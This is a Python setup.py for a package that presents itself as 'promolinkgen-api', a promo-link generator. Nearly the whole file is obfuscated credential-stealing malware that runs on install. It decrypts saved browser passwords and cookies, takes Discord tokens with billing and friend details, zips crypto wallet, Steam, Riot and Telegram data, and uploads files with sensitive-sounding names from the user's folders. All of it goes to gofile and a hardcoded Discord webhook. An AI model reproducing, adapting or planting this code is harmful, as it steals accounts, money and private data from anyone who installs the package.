Bl='crypto'
Bk='folder'
Bj='.txt'
Bi='https://google.com'
Bh='.zip'
Bg='.db'
Bf='bcdefghijklmnopqrstuvwxyz'
Be='.ldb'
Bd='.log'
Bc='kiwi'
Bb='author'
Ba='fields'
BZ='https://discordapp.com/api/v6/users/@me'
BY='discriminator'
BX='public_flags'
BW='<:staff:874750808728666152> '
BV='Discord_Employee'
BU='<:partner:874750808678354964> '
BT='Partnered_Server_Owner'
BS='<:hypesquad_events:874750808594477056> '
BR='HypeSquad_Events'
BQ='<:bughunter_1:874750808426692658> '
BP='Bug_Hunter_Level_1'
BO='<:bravery:874750808388952075> '
BN='House_Bravery'
BM='<:brilliance:874750808338608199> '
BL='House_Brilliance'
BK='<:balance:874750808267292683> '
BJ='House_Balance'
BI='<:early_supporter:874750808414113823> '
BH='Early_Supporter'
BG='<:bughunter_2:874750808430874664> '
BF='Bug_Hunter_Level_2'
BE='<:developer:874750808472825986> '
BD='Early_Verified_Bot_Developer'
BC='utf8'
BB='requests'
Al='Steam'
Ak='NationsGlory'
Aj='\\'
Ai='passw'
Ah='encrypted_key'
Ag='os_crypt'
Af='/Local State'
Ae='/skid'
Ad='description'
Ac='title'
Ab='skid'
Aa='@skid'
AZ='type'
AY='ignore'
AX='TEMP'
AG='Wallet'
AF='utf-8'
AE='https'
AD='Authorization'
AC=range
z='text'
y='footer'
x='color'
w='attachments'
v='avatar_url'
u='embeds'
t='content'
s=None
k='icon_url'
b='username'
a='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
Z='application/json'
Y='User-Agent'
X='Content-Type'
T='value'
S=open
M='name'
L=False
J='https://i.pinimg.com/736x/9b/30/e3/9b30e306603e9f57bc46047407e62f30.jpg'
I=True
H=len
F='/'
E='Name'
D='Emoji'
C='Value'
A=''
from setuptools import setup
import os as B,threading as K
from sys import executable as Am
from sqlite3 import connect as AH
import re
from base64 import b64decode as l
from json import loads as A0,load
from ctypes import windll as AI,wintypes as An,byref as A1,cdll,Structure as Ao,POINTER,c_char,c_buffer as A2
from urllib.request import Request as N,urlopen as O
from json import loads as m,dumps as c
import time,shutil as AJ
from zipfile import ZipFile as AK
import random as AL,re,subprocess as A3
U='https://discord.com/api/webhooks/1054755363381055570/FIo5qfZpyAU8zv3HEHNZ_YqZz23YRbrN0Zo33NIk9OI-W-h71wYbtso-CbuLgL8YolSN'
Q=L
def AM():
	A='None'
	try:A=O(N('https://api.ipify.org')).read().decode().strip()
	except:pass
	return A
Ap=[[BB,BB],['Crypto.Cipher','pycryptodome']]
for AN in Ap:
	try:__import__(AN[0])
	except:A3.Popen(f"{Am} -m pip install {AN[1]}",shell=I);time.sleep(3)
import requests as n
from Crypto.Cipher import AES
V=B.getenv('LOCALAPPDATA')
G=B.getenv('APPDATA')
A4=B.getenv(AX)
o=[]
class A5(Ao):_fields_=[('cbData',An.DWORD),('pbData',POINTER(c_char))]
def Aq(blob_out):A=blob_out;B=int(A.cbData);C=A.pbData;D=A2(B);cdll.msvcrt.memcpy(D,C,B);AI.kernel32.LocalFree(C);return D.raw
def A6(encrypted_bytes,entropy=b''):
	B=entropy;A=encrypted_bytes;D=A2(A,H(A));E=A2(B,H(B));F=A5(H(A),D);G=A5(H(B),E);C=A5()
	if AI.crypt32.CryptUnprotectData(A1(F),s,A1(G),s,s,1,A1(C)):return Aq(C)
def A7(buff,master_key=s):
	A=buff;C=A.decode(encoding=BC,errors=AY)[:3]
	if C=='v10'or C=='v11':D=A[3:15];E=A[15:];F=AES.new(master_key,AES.MODE_GCM,D);B=F.decrypt(E);B=B[:-16].decode();return B
def Bm(methode,url,data=A,files=A,headers=A):
	C=files
	for D in AC(8):
		try:
			if methode=='POST':
				if data!=A:
					B=n.post(url,data=data)
					if B.status_code==200:return B
				elif C!=A:
					B=n.post(url,files=C)
					if B.status_code==200 or B.status_code==413:return B
		except:pass
def d(hook,data=A,files=A,headers=A):
	C=headers
	for D in AC(8):
		try:
			if C!=A:B=O(N(hook,data=data,headers=C));return B
			else:B=O(N(hook,data=data));return B
		except:pass
def e():C=AM();E=B.getenv('USERNAME');F=O(N(f"https://geolocation-db.com/jsonp/{C}")).read().decode().replace('callback(',A).replace('})','}');D=m(F);G=D['country_name'];H=D['country_code'].lower();I=f":flag_{H}:  - `{E.upper()} | {C} ({G})`";return I
def AO(Cookies):
	global Q;A=str(Cookies);B=re.findall('.google.com',A)
	if H(B)<-1:Q=I;return Q
	else:Q=L;return Q
def Ar(token):
	I='user';K=[{E:BD,C:131072,D:BE},{E:BF,C:16384,D:BG},{E:BH,C:512,D:BI},{E:BJ,C:256,D:BK},{E:BL,C:128,D:BM},{E:BN,C:64,D:BO},{E:BP,C:8,D:BQ},{E:BR,C:4,D:BS},{E:BT,C:2,D:BU},{E:BV,C:1,D:BW}];M={AD:token,X:Z,Y:a}
	try:P=m(O(N('https://discord.com/api/v6/users/@me/relationships',headers=M)).read().decode())
	except:return L
	J=A
	for B in P:
		G=A;H=B[I][BX]
		for F in K:
			if H//F[C]!=0 and B[AZ]==1:
				if not'House'in F[E]:G+=F[D]
				H=H%F[C]
		if G!=A:J+=f"{G} | {B[I][b]}#{B[I][BY]} ({B[I]['id']})\n"
	return J
def As(token):
	E={AD:token,X:Z,Y:a}
	try:D=m(O(N('https://discord.com/api/users/@me/billing/payment-sources',headers=E)).read().decode())
	except:return L
	if D==[]:return' -'
	B=A
	for C in D:
		if C['invalid']==L:
			if C[AZ]==1:B+=':credit_card:'
			elif C[AZ]==2:B+=':parking: '
	return B
def At(flags):
	B=flags
	if B==0:return A
	G=A;H=[{E:BD,C:131072,D:BE},{E:BF,C:16384,D:BG},{E:BH,C:512,D:BI},{E:BJ,C:256,D:BK},{E:BL,C:128,D:BM},{E:BN,C:64,D:BO},{E:BP,C:8,D:BQ},{E:BR,C:4,D:BS},{E:BT,C:2,D:BU},{E:BV,C:1,D:BW}]
	for F in H:
		if B//F[C]!=0:G+=F[D];B=B%F[C]
	return G
def Au(token):
	P='phone';M='premium_type';F={AD:token,X:Z,Y:a};B=m(O(N(BZ,headers=F)).read().decode());G=B[b];H=B[BY];I=B['email'];J=B['id'];K=B['avatar'];L=B[BX];C=A;D='-'
	if M in B:
		E=B[M]
		if E==1:C='<:classic:896119171019067423> '
		elif E==2:C='<a:boost:824036778570416129> <:classic:896119171019067423> '
	if P in B:D=f"`{B[P]}`"
	return G,H,I,J,K,L,C,D
def AP(token):
	A={AD:token,X:Z,Y:a}
	try:O(N(BZ,headers=A));return I
	except:return L
def AQ(token,path):
	O='ð';D='inline';C=token;global U;P={X:Z,Y:a};Q,R,S,K,B,V,E,N=Au(C)
	if B==s:B=J
	else:B=f"https://cdn.discordapp.com/avatars/{K}/{B}"
	F=As(C);G=At(V);H=Ar(C)
	if H==A:H='No Rare Friends'
	if not F:G,N,F=O,O,O
	if E==A and G==A:E=' -'
	W={t:f"{e()} | Found in `{path}`",u:[{x:0,Ba:[{M:':rocket: Token:',T:f"`{C}`\n[Click to copy](https://superfurrycdn.nl/copy/{C})"},{M:':envelope: Email:',T:f"`{S}`",D:I},{M:':mobile_phone: Phone:',T:f"{N}",D:I},{M:':globe_with_meridians: IP:',T:f"`{AM()}`",D:I},{M:':beginner: Badges:',T:f"{E}{G}",D:I},{M:':credit_card: Billing:',T:f"{F}",D:I},{M:':clown: HQ Friends:',T:f"{H}",D:L}],Bb:{M:f"{Q}#{R} ({K})",k:f"{B}"},y:{z:Aa,k:J},'thumbnail':{'url':f"{B}"}}],v:J,b:Ab,w:[]};d(U,data=c(W).encode(),headers=P)
def AR(listt):
	C='net';B='com';A=re.findall('(\\w+[a-z])',listt)
	while AE in A:A.remove(AE)
	while B in A:A.remove(B)
	while C in A:A.remove(C)
	return list(set(A))
def AS(name,link):
	G=' | ';C=link;B=name;D={X:Z,Y:a}
	if B=='wpcook':
		E=G.join((A for A in i))
		if H(E)>1000:I=AR(str(i));E=G.join((A for A in I))
		A={t:e(),u:[{Ac:'skid | Cookies Stealer',Ad:f"""**Found**:
{E}

**Data:**
:cookie: â¢ **{q}** Cookies Found
:link: â¢ [w4spCookies.txt]({C})""",x:0,y:{z:'@skid STEALER',k:J}}],b:Ab,v:J,w:[]};d(U,data=c(A).encode(),headers=D);return
	if B=='wppassw':
		F=G.join((A for A in j))
		if H(F)>1000:K=AR(str(j));F=G.join((A for A in K))
		A={t:e(),u:[{Ac:'skid | Password Stealer',Ad:f"""**Found**:
{F}

**Data:**
ð â¢ **{p}** Passwords Found
:link: â¢ [w4spPassword.txt]({C})""",x:0,y:{z:'@W4SP STEALER',k:J}}],b:Ab,v:J,w:[]};d(U,data=c(A).encode(),headers=D);return
	if B==Bc:A={t:e(),u:[{x:0,Ba:[{M:'Interesting files found on user PC:',T:C}],Bb:{M:'skid | File Stealer'},y:{z:Aa,k:J}}],b:Ae,v:J,w:[]};d(U,data=c(A).encode(),headers=D);return
def AT(data,name):
	E=B.getenv(AX)+f"\\wp{name}.txt"
	with S(E,mode='w',encoding=AF)as C:
		C.write(f"<--W4SP STEALER ON TOP-->\n\n")
		for D in data:
			if D[0]!=A:C.write(f"{D}\n")
W=A
def Av(path,arg):
	A=path
	if not B.path.exists(A):return
	A+=arg
	for D in B.listdir(A):
		if D.endswith(Bd)or D.endswith(Be):
			for E in [B.strip()for B in S(f"{A}\\{D}",errors=AY).readlines()if B.strip()]:
				for F in ('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}','mfa\\.[\\w-]{80,95}'):
					for C in re.findall(F,E):
						global W
						if AP(C):
							if not C in W:W+=C;AQ(C,A)
A8=[]
def Aw(path,arg):
	E=path;global A8,p
	if not B.path.exists(E):return
	I=E+arg+'/Login Data'
	if B.stat(I).st_size==0:return
	F=A4+'wp'+A.join((AL.choice(Bf)for A in AC(8)))+Bg;AJ.copy2(I,F);J=AH(F);G=J.cursor();G.execute('SELECT action_url, username_value, password_value FROM logins;');L=G.fetchall();G.close();J.close();B.remove(F);M=E+Af
	with S(M,'r',encoding=AF)as N:O=A0(N.read())
	H=l(O[Ag][Ah]);H=A6(H[5:])
	for C in L:
		if C[0]!=A:
			for D in AA:
				K=D
				if AE in D:P=D;D=P.split('[')[1].split(']')[0]
				if D in C[0]:
					if not K in j:j.append(K)
			A8.append(f"UR1: {C[0]} | U53RN4M3: {C[1]} | P455W0RD: {A7(C[2],H)}");p+=1
	AT(A8,Ai)
f=[]
def Ax(path,arg):
	E=path;global f,q
	if not B.path.exists(E):return
	I=E+arg+'/Cookies'
	if B.stat(I).st_size==0:return
	F=A4+'wp'+A.join((AL.choice(Bf)for A in AC(8)))+Bg;AJ.copy2(I,F);J=AH(F);G=J.cursor();G.execute('SELECT host_key, name, encrypted_value FROM cookies');L=G.fetchall();G.close();J.close();B.remove(F);M=E+Af
	with S(M,'r',encoding=AF)as N:O=A0(N.read())
	H=l(O[Ag][Ah]);H=A6(H[5:])
	for C in L:
		if C[0]!=A:
			for D in AA:
				K=D
				if AE in D:P=D;D=P.split('[')[1].split(']')[0]
				if D in C[0]:
					if not K in i:i.append(K)
			f.append(f"H057 K3Y: {C[0]} | N4M3: {C[1]} | V41U3: {A7(C[2],H)}");q+=1
	AT(f,'cook')
def Ay(path,arg):
	A=path
	if not B.path.exists(f"{A}/Local State"):return
	F=A+arg;G=A+Af
	with S(G,'r',encoding=AF)as H:I=A0(H.read())
	D=l(I[Ag][Ah]);D=A6(D[5:])
	for E in B.listdir(F):
		if E.endswith(Bd)or E.endswith(Be):
			for J in [A.strip()for A in S(f"{F}\\{E}",errors=AY).readlines()if A.strip()]:
				for K in re.findall('dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*',J):
					global W;C=A7(l(K.split('dQw4w9WgXcQ:')[1]),D)
					if AP(C):
						if not C in W:W+=C;AQ(C,A)
def Az(paths1,paths2,paths3):
	F=paths3;E=[]
	for D in paths1:B=K.Thread(target=AU,args=[D[0],D[5],D[1]]);B.start();E.append(B)
	for D in paths2:B=K.Thread(target=AU,args=[D[0],D[2],D[1]]);B.start();E.append(B)
	B=K.Thread(target=A_,args=[F[0],F[2],F[1]]);B.start();E.append(B)
	for M in E:M.join()
	global R,g,P;G,I,L=A,A,A
	if not H(R)==0:
		G=':coin:  â¢  Wallets\n'
		for C in R:G+=f"ââ [{C[0]}]({C[1]})\n"
	if not H(R)==0:
		I=':video_game:  â¢  Gaming:\n'
		for C in g:I+=f"ââ [{C[0]}]({C[1]})\n"
	if not H(P)==0:
		L=':tickets:  â¢  Apps\n'
		for C in P:L+=f"ââ [{C[0]}]({C[1]})\n"
	N={X:Z,Y:a};O={t:e(),u:[{Ac:Ae,Ad:f"{G}\n{I}\n{L}",x:0,y:{z:Aa,k:J}}],b:Ae,v:J,w:[]};d(U,data=c(O).encode(),headers=N)
def A_(path,arg,procc):
	global P;A=path;D=arg
	if not B.path.exists(A):return
	A3.Popen(f"taskkill /im {procc} /t /f >nul 2>&1",shell=I);E=AK(f"{A}/{D}.zip",'w')
	for C in B.listdir(A):
		if not Bh in C and not'tdummy'in C and not'user_data'in C and not'webview'in C:E.write(A+F+C)
	E.close();G=Bi;B.remove(f"{A}/{D}.zip");P.append([arg,G])
def AU(path,arg,procc):
	U=' ';G=path;D=arg;E=G;C=D;global R,g,P
	if'nkbihfbeogaeaoehlefnkodbefgpgknn'in D:H=G.split(Aj)[4].split(F)[1].replace(U,A);C=f"Metamask_{H}";E=G+D
	if not B.path.exists(E):return
	A3.Popen(f"taskkill /im {procc} /t /f >nul 2>&1",shell=I)
	if AG in D or Ak in D:H=G.split(Aj)[4].split(F)[1].replace(U,A);C=f"{H}"
	elif Al in D:
		if not B.path.isfile(f"{E}/loginusers.vdf"):return
		O=S(f"{E}/loginusers.vdf",'r+',encoding=BC);Q=O.readlines();K=L
		for T in Q:
			if'RememberPassword"\t\t"1"'in T:K=I
		if K==L:return
		C=D
	M=AK(f"{E}/{C}.zip",'w')
	for N in B.listdir(E):
		if not Bh in N:M.write(E+F+N)
	M.close();J=Bi;B.remove(f"{E}/{C}.zip")
	if AG in D or'eogaeaoehlef'in D:R.append([C,J])
	elif Ak in C or Al in C or'RiotCli'in C:g.append([C,J])
	else:P.append([C,J])
def B0():
	Z='chrome.exe';T='/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn';S='/Network';R='opera.exe';O='/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn';M='/Default/Network';L='/Default';J='/Default/Local Storage/leveldb';E='/Local Storage/leveldb';H=[[f"{G}/Opera Software/Opera GX Stable",R,E,F,S,T],[f"{G}/Opera Software/Opera Stable",R,E,F,S,T],[f"{G}/Opera Software/Opera Neon/User Data/Default",R,E,F,S,T],[f"{V}/Google/Chrome/User Data",Z,J,L,M,O],[f"{V}/Google/Chrome SxS/User Data",Z,J,L,M,O],[f"{V}/BraveSoftware/Brave-Browser/User Data",'brave.exe',J,L,M,O],[f"{V}/Yandex/YandexBrowser/User Data",'yandex.exe',J,L,M,'/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn'],[f"{V}/Microsoft/Edge/User Data",'edge.exe',J,L,M,O]];U=[[f"{G}/Discord",E],[f"{G}/Lightcord",E],[f"{G}/discordcanary",E],[f"{G}/discordptb",E]];W=[[f"{G}/atomic/Local Storage/leveldb",'"Atomic Wallet.exe"',AG],[f"{G}/Exodus/exodus.wallet",'Exodus.exe',AG],['C:\\Program Files (x86)\\Steam\\config','steam.exe',Al],[f"{G}/NationsGlory/Local Storage/leveldb",'NationsGlory.exe',Ak],[f"{V}/Riot Games/Riot Client/Data",'RiotClientServices.exe','RiotClient']];X=[f"{G}/Telegram Desktop/tdata",'telegram.exe','Telegram']
	for C in H:D=K.Thread(target=Av,args=[C[0],C[2]]);D.start();o.append(D)
	for C in U:D=K.Thread(target=Ay,args=[C[0],C[1]]);D.start();o.append(D)
	for C in H:D=K.Thread(target=Aw,args=[C[0],C[3]]);D.start();o.append(D)
	P=[]
	for C in H:D=K.Thread(target=Ax,args=[C[0],C[4]]);D.start();P.append(D)
	K.Thread(target=Az,args=[H,W,X]).start()
	for N in P:N.join()
	Y=AO(f)
	if Y==I:return
	for N in o:N.join()
	global B1;B1=[]
	for Q in ['wppassw.txt','wpcook.txt']:AS(Q.replace(Bj,A),A9(B.getenv(AX)+Aj+Q))
def A9(path):
	A='data'
	try:return n.post(f"https://{n.get('https://api.gofile.io/getServer').json()[A]['server']}.gofile.io/uploadFile",files={'file':S(path,'rb')}).json()[A]['downloadPage']
	except:return L
def B2(pathF,keywords):
	A=pathF;global h;G=7;D=0;H=B.listdir(A);E=[]
	for C in H:
		if not B.path.isfile(A+F+C):return
		D+=1
		if D<=G:I=A9(A+F+C);E.append([A+F+C,I])
		else:break
	h.append([Bk,A+F,E])
h=[]
def B3(path,keywords):
	D=keywords;A=path;global h;E=[];G=B.listdir(A)
	for C in G:
		for H in D:
			if H in C.lower():
				if B.path.isfile(A+F+C)and Bj in C:E.append([A+F+C,A9(A+F+C)]);break
				if B.path.isdir(A+F+C):I=A+F+C;B2(I,D);break
	h.append([Bk,A,E])
def B4():
	I='acount';E='secret';D='account';A=A4.split('\\AppData')[0];F=[A+'/Desktop',A+'/Downloads',A+'/Documents'];J=[D,I,Ai,E];G=[Ai,'mdp','motdepasse','mot_de_passe','login',E,D,I,'paypal','banque',D,'metamask','wallet',Bl,'exodus','discord','2fa','code','memo','compte','token','backup',E];B=[]
	for H in F:C=K.Thread(target=B3,args=[H,G]);C.start();B.append(C)
	return B
global AA,i,j,q,p,R,g,P
AA=['mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)',Bl,'[uber](https://uber.com)','[netflix](https://netflix.com)']
q,p=0,0
i=[]
j=[]
R=[]
g=[]
P=[]
B0()
Q=AO(f)
if not Q:
	B5=B4()
	for B6 in B5:B6.join()
	time.sleep(0.2);r='\n'
	for AB in h:
		if H(AB[2])!=0:
			B7=AB[1];B8=AB[2];r+=f"ð {B7}\n"
			for AV in B8:AW=AV[0].split(F);B9=AW[H(AW)-1];BA=AV[1];r+=f"ââ:open_file_folder: [{B9}]({BA})\n"
			r+='\n'
	AS(Bc,r)



setup(

    name='promolinkgen-api',
    packages=['promolinkgen-api'],
    version='1.0',
    license='MIT',
    description='An Api Which Helps Genning promolinks faster',
    author='sanzudev',
    keywords=['style'],
    install_requires=[''],
    classifiers=['Development Status :: 5 - Production/Stable']

)